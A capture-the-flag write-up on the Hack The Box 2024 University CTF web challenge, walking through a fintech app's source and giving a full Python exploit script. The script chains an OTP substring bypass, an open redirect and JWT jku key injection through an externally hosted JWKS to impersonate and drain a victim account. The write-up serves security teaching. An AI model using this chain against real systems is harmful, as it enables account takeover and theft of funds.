---
title: Web Breaking Bad from Hack The Box 2024 University CTF 
date: 2024-12-17 00:00:00 +0000
categories: [CAPTURE THE FLAG]
tags: [cybersecurity, writeup, web, jwt, otp]
---

# Introduction
For the first and last time I was able to go through the annual Hack The Box CTF dedicated to University student. While raising some flags, I found the first challenge in we really interesting. It was tagged as easy but I would have more tagged it as medium as I spent couple of hours trying to figure out what was going on. You have to know the architecture of a modern web server, APIs and some backend. I wasn't really an expert at JavaScript but it definitively could help. Anyways here's a writeup of the solutions.

# Scope and plot

As a reminder, we were provided a personnal docker container with the flag inside of it and the source code without the flag (with a fake one). So we could read through all the code while trying to understand where the vulnerabilities were at. The statement was talking about disrupting a finance website. 

# Messing around

After downloading the code and while the container was spinning up, I was reading the code and found the fake flag at the root of the project, I then looked for any easy RCE by playing around with the website and reading how sanitized the input were at code level but found nothing, I created an account and got rickrolled by a discount (twice). Finally I stumbled upon a service file in the code called  `flagService.js` which looked like this:

```JavaScript
import { getBalancesForUser } from '../services/coinService.js';
import fs from 'fs/promises';

const FINANCIAL_CONTROLLER_EMAIL = "financial-controller@frontier-board.htb";

/**
 * Checks if the financial controller's CLCR wallet is drained
 * If drained, returns the flag.
 */
export const checkFinancialControllerDrained = async () => {
    const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL);
    const clcrBalance = balances.find((coin) => coin.symbol === 'CLCR');

    if (!clcrBalance || clcrBalance.availableBalance <= 0) {
        const flag = (await fs.readFile('/flag.txt', 'utf-8')).trim();
        return { drained: true, flag };
    }

    return { drained: false };
};
```

From now on I knew that they expected me to empty the account of someone with this email to make the flag pop up somewhere. I do have a section in the website with transactions, the problem is: I can only send money to someone. I tried to add the account as a friend but didn't have any reply :'\).
So I began to look up with the API and this is where things started to ~~pay~~ become time-consuming.

# The backend 

## API

The server code was using a pretty much classic routes-services architecture with a little something called middleware. I first tried to look for the `crypto.js` route file containing all the API informations related on how to make a transaction without having to deal with the frontend. Especially the transaction post-route which was my first idea to exploit.

```JavaScript
fastify.post(
    '/transaction',
    { preHandler: [rateLimiterMiddleware(), otpMiddleware()] },
    async (req, reply) => {
      const { to, coin, amount } = req.body;
      const userId = req.user.email; 
  
      try {
        if (!to || !coin || !amount) {
          return reply.status(400).send({ error: "Missing required fields" });
        }
        
        const supportedCoins = await getSupportedCoins(); 
        if (!supportedCoins.includes(coin.toUpperCase())) {
            return reply.status(400).send({ error: "Unsupported coin symbol." });
        }
        
        const parsedAmount = parseFloat(amount);
        if (isNaN(parsedAmount) || parsedAmount <= 0) {
          return reply.status(400).send({ error: "Amount must be a positive number." });
        }

        const userExists = await validateUserExists(to);
        if (!userExists) {
          return reply.status(404).send({ error: "Recipient user does not exist." });
        }
  
        if (userId === to) {
          return reply.status(400).send({ error: "Cannot perform transactions to yourself." });
        }

        const result = await transactionByEmail(to, userId, parseFloat(amount), coin.toUpperCase());
  
        if (!result.success) {
          return reply.status(result.status).send({ error: result.error });
        }
  
        reply.send(result);
      } catch (err) {
        console.error("Transaction error:", err);
        reply.status(err.status || 500).send({ error: err.error || "An unknown error occurred during the transaction." });
      }
    }
  );
```
I tried for a long time to exploit this without success, then I saw that the middleware thing was called invoking a rateLimiter (I am fine with that) but also a otp ??? Like One Time Pass ?? So I absolutely forgot about the flag for a moment and went to see the code of the otp middleWare.

## One Time Pass 

```JavaScript
import { hgetField } from '../utils/redisUtils.js';

export const otpMiddleware = () => {
  return async (req, reply) => {
    const userId = req.user.email;
    const { otp } = req.body;

    const redisKey = `otp:${userId}`;
    const validOtp = await hgetField(redisKey, 'otp');

    if (!otp) {
      reply.status(401).send({ error: 'OTP is missing.' });
      return
    }

    if (!validOtp) {
      reply.status(401).send({ error: 'OTP expired or invalid.' });
      return;
    }

    // TODO: Is this secure enough?
    if (!otp.includes(validOtp)) {
      reply.status(401).send({ error: 'Invalid OTP.' });
      return;
    }
  };
};
```
I am not showing all the code here but the middleWare used to take a random number from 1000 to 9999 and store it in a Redis database where it was pulled to be checked before the request reached the transaction route. Therefore I have to post a "otp" field in my json alongside the other informations I had to pass and there was no way for me pull out the redis token out of here. But the comments in the code brighten my mind as it was giving me a hint on insecure code. 

After a couple of minutes of producing brain juice, I found the flaw in the code: the __includes__ function is not a strict equal and the code check if the otp from Redis belong to a substring of the otp that we input ! Meaning you can easily bypass this by just generating otp as being a concatenation of all the different combinaison of number from 1000 to 9999. So I tried and got a valid otp after a couple of time

> The `includes` function have to go through all the string you send it and FYI, all numbers concatenated from 1000 to 9999 are more than 35 000 characters so each requests with OTP took a while. I wanted to optimize this so I asked myself if it was possible to reduce the string lenght and almost fell in the rabbithole of "supercombinaison" which is a mathematical field where you can potentially find an optimized arangement of sequence of numbers so all the numbers from 1000 to 9999 are included. I tried to bruteforce the thing, failed, and decided it wasn't worth it given the time but still I learnt something. Might get interested later as it could be part of an interesting thing to do as a challenge. 

All this OTP stuff made me forgot I was actually looking for a flag but the idea of having to hack the account to empty it instead of just trying to bruteforce the API started to grow in my head. I took advantage of the "hint" in the first time to look for other comments in the code by searching "// TODO: " and it paid.

![Desktop View](/assets/img/2024-12-17-htb-web-breaking-bad/TODO_hints.png)

## Openredirect 

So I jumped straight to the next file which was about redirection (the code was really easy to understand) and I got it, tried it, got redirected to Google when asked `http://127.0.0.1:1337/api/analytics/redirect?url=https://www.google.com&ref=whatever` (see the code below, you have to use the ref argument no matter what you put in it).

```JavaScript
import { trackClick, getAnalyticsData } from '../services/analyticsService.js';

export default async function analyticsRoutes(fastify) {
    fastify.get('/redirect', async (req, reply) => {
        const { url, ref } = req.query;

        if (!url || !ref) {
            return reply.status(400).send({ error: 'Missing URL or ref parameter' });
        }
        // TODO: Should we restrict the URLs we redirect users to?
        try {
            await trackClick(ref, decodeURIComponent(url));
            reply.header('Location', decodeURIComponent(url)).status(302).send();
        } catch (error) {
            console.error('[Analytics] Error during redirect:', error.message);
            reply.status(500).send({ error: 'Failed to track analytics data.' });
        }
    });

    fastify.get('/data', async (req, reply) => {
        const { start = 0, limit = 10 } = req.query;

        try {
            const analyticsData = await getAnalyticsData(parseInt(start), parseInt(limit));
            reply.send(analyticsData);
        } catch (error) {
            console.error('[Analytics] Error fetching data:', error.message);
            reply.status(500).send({ error: 'Failed to fetch analytics data.' });
        }
    });
}
```

An open redirect is really nice but you cannot really use it alone unless you are planning on doing some phishing. But it really becomes dangerous when you can combine it with other vulnerabilities and knowing that I had one last file to see that had a TODO comment, all the pieces of the puzzle about taking control of the account started to come together.

## JWKS

I had to do some research on that before starting. I knew about JWT (JSON Web Token) and how to exploit them, what I didn't know was JWKS (JSON Web Key Set) which is kind of similar. Again, it took me a couple of minutes to figure out what was going on once I wrapped my mind around JWKS.

Here's a quick explanations about JWK/JWKS:
> A JWK is a JSON object representing a single cryptographic key. It holds vital identification data, such as the key type, key identifier, the cryptographic algorithm used to sign it, usage restrictions, and other additional details for verifying a JWT signature and decoding it to plaintext. Think of a JWK as the individual key in our building example, but only the public key value is accessible within the JWK, ensuring that the private key stays confidential and secure.
>
> A JWKS is also a JSON object notation, but it contains an array or collection of individual JWK objects. Put simply, JWKS is a set of public keys that can be used to verify the JWTs issued by a specific authorization server.

According to the rest of the code, here is how a JWT token should be forged to comply with the website:
```JSON
{
  "header":{
    "alg": "RS256",
    "typ": "JWT",
    "kid": "Key identifier, unique id selected by the server",
    "jku": "JSON Key Url, pointing where the system should pick keys to verify signature"
  },
  "payload":{
    "email": "email associated with the account",
    "iat": "Issued AT, time when token have been issued",
    "exp": "expiration time of the token"
  }
}
``` 

This is the extracted function of the code in charge to verify token along with the constants:
```JavaScript
const KEY_PREFIX = "rsa-keys";
const JWKS_URI = "http://127.0.0.1:1337/.well-known/jwks.json";
const KEY_ID = uuidv4();

export const verifyToken = async (token) => {
  try {
    const decodedHeader = jwt.decode(token, { complete: true });

    if (!decodedHeader || !decodedHeader.header) {
      throw new Error("Invalid token: Missing header");
    }

    const { kid, jku } = decodedHeader.header;
    console.log(decodedHeader);

    if (!jku) {
      throw new Error("Invalid token: Missing header jku");
    }

    // TODO: is this secure enough?
    if (!jku.startsWith("http://127.0.0.1:1337/")) {
      throw new Error(
        "Invalid token: jku claim does not start with http://127.0.0.1:1337/"
      );
    }

    if (!kid) {
      throw new Error("Invalid token: Missing header kid");
    }

    if (kid !== KEY_ID) {
      return new Error("Invalid token: kid does not match the expected key ID");
    }

    let jwks;
    try {
      const response = await axios.get(jku);
      if (response.status !== 200) {
        throw new Error(`Failed to fetch JWKS: HTTP ${response.status}`);
      }
      jwks = response.data;
    } catch (error) {
      throw new Error(`Error fetching JWKS from jku: ${error.message}`);
    }

    if (!jwks || !Array.isArray(jwks.keys)) {
      throw new Error(`Invalid JWKS: Expected keys array, got ${jwks}`);
    }

    const jwk = jwks.keys.find((key) => key.kid === kid);
    if (!jwk) {
      throw new Error("Invalid token: kid not found in JWKS");
    }

    if (jwk.alg !== "RS256") {
      throw new Error("Invalid key algorithm: Expected RS256");
    }

    if (!jwk.n || !jwk.e) {
      throw new Error("Invalid JWK: Missing modulus (n) or exponent (e)");
    }

    const publicKey = jwkToPem(jwk);

    const decoded = jwt.verify(token, publicKey, { algorithms: ["RS256"] });
    return decoded;
  } catch (error) {
    console.error(`Token verification failed: ${error.message}`);
    throw error;
  }
};
```

So the plan is to forge the correct JWK token to impersonate the account we want to empty by changing the `jku` value and point it to an endpoint that we would have set up containing our keys. As seen in the code, the `jku` value shoud start with `http://127.0.0.1:1337` and here is where our open redirect vulnerablity comes into play. We could write `http://127.0.0.1:1337/api/analytics/redirect?url={evil_endpoint}&ref=whatever`. As for the required OTP for the transaction, it has been solved above.

# The wrapper

As I was struggling with some tools and doing all my requests using curl, I realized that a Python wrapper have been provided with the source code which could have saved me so much time. Most of the code such as functions for login, registration, transactions etc. was already provided. All I had to do was to put all the pieces together. However, having to go through everything manually without the wrapper gave me a deeper understanding of what was involved. That said I still took the wrapper, and optimized it to get the flag fully automatically. 

## Constraints

Like most of us, I do not have a server ready to be used as an evil endpoint at anytime to host my keys and inject the value into `jku`. So I used [TMP Files](https://tmpfiles.org) which allow you to upload files to the web, available through a link for a limited time for free with an API. 

I also had to automate the asymetric key generation using another Python module. This step is clearly optional but I really wanted to fully automate the solution.

## Code 

```Python
import requests, datetime, os, jwt, json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from jwcrypto import jwk 

HOST = 'http://127.0.0.1:1337'
FINANCIAL_EMAIL = 'financial-controller@frontier-board.htb'
COIN_SYMBOL = 'CLCR'


def create_forged_jwt(jku_url, kid, priv_key, payload):
    tok = {
        "header":{
            "alg": "RS256",
            "typ": "JWT",
            "kid": kid,
            "jku": jku_url
        },
        "payload":payload
    }
    return jwt.encode(tok["payload"], priv_key, "RS256", tok["header"]) 

def validate_token(forged_token):
    response = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {forged_token}'})
    if response.status_code == 200:
        print('[+] JWT validation successful! Response:')
        print(response.json())
    else:
        print(f'[!] JWT validation failed. Status: {response.status_code}, Response: {response.text}')

payload = {
    'email': FINANCIAL_EMAIL,
    'iat': datetime.datetime.utcnow(),
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=0, hours=6, seconds=0)
}

def register_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/register', 
        json=user
    )
    if r.status_code == 200:
        print(f'User registered successfully: {email}')
    else:
        print(f'Failed to register user: {email}, Response: {r.text}')

def login_user(email, password):
    user = {'email': email, 'password': password}
    r = requests.post(
        f'{HOST}/api/auth/login', 
        json=user
    )
    if r.status_code == 200:
        data = r.json()
        token = data['token']
        print(f'Login successful for: {email}, Token: {token}')
        return token
    else:
        print(f'Login failed for: {email}, Response: {r.text}')
        return None

def send_friend_request(token, to_email):
    r = requests.post(
        f'{HOST}/api/users/friend-request',
        json={'to': to_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request sent to: {to_email}')
    else:
        print(f'Failed to send friend request to {to_email}: {r.text}')

def fetch_friend_requests(token):
    r = requests.get(
        f'{HOST}/api/users/friend-requests',
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        requests_data = r.json()
        print('Pending friend requests:', requests_data.get('requests', []))
    else:
        print(f'Failed to fetch friend requests: {r.status_code} {r.text}')

def accept_friend_request(token, from_email):
    r = requests.post(
        f'{HOST}/api/users/accept-friend',
        json={'from': from_email},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Friend request from {from_email} accepted.')
    else:
        print(f'Failed to accept friend request from {from_email}: {r.text}')

def fetch_balance(token):
    r = requests.get(
        f'{HOST}/api/crypto/balance', 
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        balances = r.json()
        for coin in balances:
            if coin['symbol'] == COIN_SYMBOL:
                print(f'Balance for {COIN_SYMBOL}: {coin["availableBalance"]}')
                return coin['availableBalance']
        else:
            print(f'Failed to fetch balances: {r.text}')
    return 0

def make_transaction(token, to_email, coin, amount, otp):
    r = requests.post(
        f'{HOST}/api/crypto/transaction',
        json={'to': to_email, 'coin': coin, 'amount': amount, 'otp': otp},
        headers={'Authorization': f'Bearer {token}'}
    )
    if r.status_code == 200:
        print(f'Transaction of {amount} {coin} to {to_email} completed successfully.')
    else:
        print(f'Failed to make transaction to {to_email}: {r.text}')

def fetch_flag(token):
    r = requests.get(f'{HOST}/api/dashboard', headers={'Authorization': f'Bearer {token}'})
    if r.status_code == 200:
        data = r.json()
        if 'flag' in data:
            print(f'Flag: {data["flag"]}')
        else:
            print('Flag not found in the response.')
    else:
        print(f'Failed to fetch dashboard: {r.text}')

# Generating RSA keypair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
encrypted_pem_priv_key = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()  
)
pem_public_key = private_key.public_key().public_bytes(
  encoding=serialization.Encoding.PEM,
  format=serialization.PublicFormat.SubjectPublicKeyInfo
)
priv_key = encrypted_pem_priv_key.decode()

# Creating user
dummy_user = {'email': f'{os.urandom(10).hex()}@htb.com', 'password': '1337'}

register_user(dummy_user['email'], dummy_user['password'])

if (dummy_token:=login_user(dummy_user['email'], dummy_user['password'])):
    send_friend_request(dummy_token, FINANCIAL_EMAIL)

kid = jwt.get_unverified_header(dummy_token)["kid"]
#Then we need an external endpoint so pushing the private JWKS file with custom kid to https://tmpfiles.org/
file_name = 'jwks.json'
url = 'https://tmpfiles.org/api/v1/upload'

# Write the file on the computer
with open(file_name, 'w') as f:
    json.dump({'keys': [{**jwk.JWK.from_pem(priv_key.encode()),**{'use':'sig', 'kid':kid, "alg": "RS256"}}]},f)

# Open the file and upload it
with open(file_name, 'rb') as f:
    files = {'file': f}
    response = requests.post(url, files=files)

jwks_url_id = response.json()["data"]["url"].split("/")[3]
jku_url = f"http://127.0.0.1:1337/api/analytics/redirect?url=https://tmpfiles.org/dl/{jwks_url_id}/jwks.json&ref=dummyref"
print(jku_url)
forged_token = create_forged_jwt(jku_url, kid, priv_key, payload)
print(f'[~] Forged JWT: {forged_token}')

print('[+] Validating forged JWT against /api/dashboard...')
validate_token(forged_token)

financial_token = forged_token

if financial_token:
    fetch_friend_requests(financial_token)
    accept_friend_request(financial_token, dummy_user['email'])

if financial_token and dummy_token:
    cluster_credit_balance = fetch_balance(financial_token)
    if cluster_credit_balance > 0:
        otp = ''.join(str(i) for i in range(1000, 10000))
        make_transaction(financial_token, dummy_user['email'], COIN_SYMBOL, cluster_credit_balance, otp)

    fetch_flag(financial_token)

```
This code allow an automatic exploit, without owning an evil endpoint. 

It register a user, log it in, send a friend request to the account to empty to check if it is working, then use all mentionned above (RSA key generating, upload of `jwks.json`, bypass TOTP...) to fake being the account to empty and send transaction to the newly created account until it reaches 0 which dumps the password on the dashboard, which is being scrapped and outputed in the console. 

# Conclusion

This conclude this interesting challenge that took me more time than required but at least I learnt a valuable code analysis skill that I already used in other capture the flags.  

# Refs

- [Hack the box's Github repo](https://github.com/hackthebox/university-ctf-2024/tree/master/web/%5BEasy%5D%20Breaking%20Bank)
- [TMP Files](https://tmpfiles.org)
